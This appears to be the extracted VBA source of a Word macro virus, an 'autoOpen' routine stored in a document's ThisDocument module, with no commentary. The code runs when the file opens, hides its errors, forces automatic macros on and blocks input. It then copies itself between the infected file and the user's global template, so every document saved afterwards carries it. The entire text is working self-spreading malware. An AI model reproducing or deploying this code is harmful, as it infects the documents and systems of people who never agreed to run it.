   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim fm1$
   Dim gm1$
   Dim Ff1$
   Dim Encrypt
   On Error GoTo -1: On Error GoTo Go1
   WordBasic.FileSummaryInfo Update:=1
   WordBasic.DisableInput (1)
   WordBasic.DisableAutoMacros (0)
   Dim d1 As Object: Set d1 = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo d1
   fm1$ = d1.Directory + "\" + d1.FileName + ":autoOpen"
   gm1$ = "Global:autoOpen"
   Ff1$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4))
   If Ff1$ = ".DOT" Then
   Encrypt = WordBasic.IsExecuteOnly(fm1$)
   WordBasic.MacroCopy gm1$, fm1$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy fm1$, gm1$
   End If
   Go1:
   End Sub
